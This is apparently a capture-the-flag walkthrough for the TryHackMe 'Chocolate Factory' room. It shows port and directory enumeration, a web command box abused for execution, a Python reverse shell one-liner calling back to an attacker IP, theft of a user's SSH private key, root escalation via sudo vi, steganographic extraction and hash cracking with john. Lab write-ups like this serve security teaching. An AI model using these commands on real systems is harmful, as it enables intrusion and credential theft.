# Chocolate Factory

![Charlie](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/8b5d62d5-05e3-4c30-a535-8acbab677d09)

## Enumeration

We begin by enumerating the target :

```bash
nmap -sT -sV 10.10.198.134
```
![nmap](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/005c2016-e177-4bdd-99fd-482577aae1cf)

as it shows there are plenty of ports open like `21` , `22`, `80` and other ports.

on port 80 you can see there is a login page :

![loginpage](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/7cf3893c-0f7a-44bf-a7ab-374b23889d0d)

but we don't have any credentials, and **SQLi** attack does not work here.

let's FUZZ the website with `ffuf` :

```bash
ffuf -w ~/wordlist/raft-medium-files.txt  -u http://10.10.198.134/FUZZ -fc 403
```

![ffuf](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/f894ce42-01c1-4dde-a574-2eb132bdbece)

yes , we have found 2 new directory : `home.php` and `validate.php`

navigate to `home.php` and there is an input box which you can type a command :

![home](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/46db25de-4d09-4703-8c44-3e267a9fc820)

use `ls` command to see the contents of the current directory :
```
 home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php 
```

download `key_rev_key` file and see the `strings` of it :

```bash
strings key_rev_key
```

![key](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/1617e853-9449-4961-83d9-c91605f31c5d)

note and keep it.

let's download the `index.php.bak` file and see the source code :

```php
<?php
    if(isset($_POST['command']))
    {
        $cmd = $_POST['command'];
        echo shell_exec($cmd);
    }
?>   
```
so we can run any commands here

## Gaining Shell

i use a python3 reverse shell to gain access

on kali linux : 

```bash
nc -lvnp 4444
```

python3 reverse shell :

```python
export RHOST="10.18.57.234";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

we gain the shell as `www-data` 

navigate to `/home/charlie` , here we don't have access to `user.txt` but we can read the content of `teleport` which is charlie private key and `teleport.pub`

save the content of teleport file and ssh to machine with this private key

```bash
ssh -i charlie.key charlie@10.10.198.134
```

now we are user charlie and can cat the content of user.txt and find the first flag:

```bash
cat user.txt
```

## Privilege Escalation

let's see if we can escalate our privileges, i use `sudo -l` to see any sudo permissions that user charlie has :

```bash
sudo -l
```

![sudo](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/0b659a79-d057-4df8-b2c6-4418390e1040)

we can run `/usr/bin/vi` as sudo, then do it and open another shell within vi and become root :

```bash
:!/bin/bash
```

navigate to `/root` we see `root.py`, we need to execute it with `python` not python3 :

```python
python root.py
```

![rootpy](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/57b87de9-93b2-4f97-b91f-65222d8bc8aa)

enter the key you found in `key_rev_key` like this :

![root](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/a9fda0e2-bbc1-494b-a754-035d1b313936)

and you find the second flag.

## Charlie Password

To get the charlie password try to login to ftp with `anonymous` user :

```bash
ftp 10.10.198.134
```

![ftp](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/01c16df5-2a33-4e7b-b872-22228a3746e1)

download the image with `get gum_room.jpg` and look to see if any data is embedded inside it :

```bash
steghide info gum_room.jpg
```

it needs a password to show the info, just use a blank password and you see a b64.txt file is embedded inside

extract `b64.txt` using steghide :

```bash
steghide extract -sf gum_room.jpg
```

decode it :

```bash
cat b64.txt | base64 -d
```

![b64](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/fe129af1-ef4a-4083-aa20-477e02c4bae5)

we need to crack the charlie hashed password, save the last line in a text file and use `john` to crack it :

```bash
john hash.txt --wordlist=/usr/share/wordlist/rouckyou.txt
```
it must get you the password within 5 to 10 minutes.

This is how you solve this challenge.
